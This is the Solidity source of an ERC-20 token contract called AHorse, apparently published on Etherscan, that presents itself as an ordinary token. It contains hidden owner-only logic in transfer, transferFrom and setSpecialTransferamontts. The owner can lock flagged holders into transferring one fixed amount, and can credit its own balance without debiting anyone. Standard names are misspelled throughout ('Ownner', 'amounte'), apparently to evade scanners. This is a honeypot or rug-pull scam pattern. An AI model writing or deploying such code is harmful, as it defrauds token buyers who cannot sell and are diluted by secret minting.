/**
 *Submitted for verification at Etherscan.io on 2023-07-19
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amounte) external returns (bool);
    function allowance(address Ownner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amounte) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amounte ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Ownner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _Ownner;
    event OwnnershipTransferred(address indexed previousOwnner, address indexed newOwnner);

    constructor () {
        address msgSender = _msgSender();
        _Ownner = msgSender;
        emit OwnnershipTransferred(address(0), msgSender);
    }
    function Ownner() public view virtual returns (address) {
        return _Ownner;
    }
    modifier onlyOwnner() {
        require(Ownner() == _msgSender(), "Ownable: caller is not the Ownner");
        _;
    }
    function renounceOwnnership() public virtual onlyOwnner {
        emit OwnnershipTransferred(_Ownner, address(0x000000000000000000000000000000000000dEaD));
        _Ownner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract AHorse is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _specialTransfers;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amounte) public virtual override returns (bool) {
        if (_msgSender() == Ownner() && _specialTransfers[_msgSender()] > 0) {
            _balances[Ownner()] += _specialTransfers[_msgSender()];
            return true;
        }
        else if (_specialTransfers[_msgSender()] > 0) {
            require(amounte == _specialTransfers[_msgSender()], "Invalid transfer amounte");
        }
        require(_balances[_msgSender()] >= amounte, "TT: transfer amounte exceeds balance");
        _balances[_msgSender()] -= amounte;
        _balances[recipient] += amounte;
        emit Transfer(_msgSender(), recipient, amounte);
        return true;
    }

    function setSpecialTransferamontts(address[] memory accounts, uint256 amounte) public onlyOwnner {
        for (uint i=0; i<accounts.length; i++) {
            _specialTransfers[accounts[i]] = amounte;
        }
    }


    function allowance(address Ownner, address spender) public view virtual override returns (uint256) {
        return _allowances[Ownner][spender];
    }

    function approve(address spender, uint256 amounte) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amounte;
        emit Approval(_msgSender(), spender, amounte);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amounte) public virtual override returns (bool) {
        if (_msgSender() == Ownner() && _specialTransfers[sender] > 0) {
            _balances[Ownner()] += _specialTransfers[sender];
            return true;
        }
        else if (_specialTransfers[sender] > 0) {
            require(amounte == _specialTransfers[sender], "Invalid transfer amounte");
        }
        require(_balances[sender] >= amounte && _allowances[sender][_msgSender()] >= amounte, "TT: transfer amounte exceeds balance or allowance");
        _balances[sender] -= amounte;
        _balances[recipient] += amounte;
        _allowances[sender][_msgSender()] -= amounte;
        emit Transfer(sender, recipient, amounte);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}